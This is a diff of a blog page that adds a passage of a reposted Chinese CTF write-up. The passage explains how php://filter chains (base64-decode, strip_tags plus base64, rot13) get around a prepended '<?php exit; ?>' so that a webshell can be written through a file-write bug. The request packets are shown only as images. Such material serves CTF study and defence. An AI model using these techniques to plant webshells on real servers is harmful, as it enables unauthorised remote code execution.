+<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
+<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
+<p>最后效果是 ：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-5.png" alt="1-5"></p>
+<h2 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h2><p>有的同学说，base64的算法我不懂，上面的方法太复杂了。</p>
+<p>其实，除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
+<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
+<p>编写如下测试代码即可查看 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&apos;php://filter/read=string.strip_tags/resource=php://input&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-6.png" alt="1-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-7.png" alt="1-7"></p>
+<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
+<p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
+<p>最终的数据包如下：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-8.png" alt="1-8"></p>
+<p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-9.png" alt="1-9"></p>
+<p>当然，这个方法的条件就是不开启短标签</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/">展开全文 >></a>
         </p>
       
 
@@ -2145,11 +2207,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
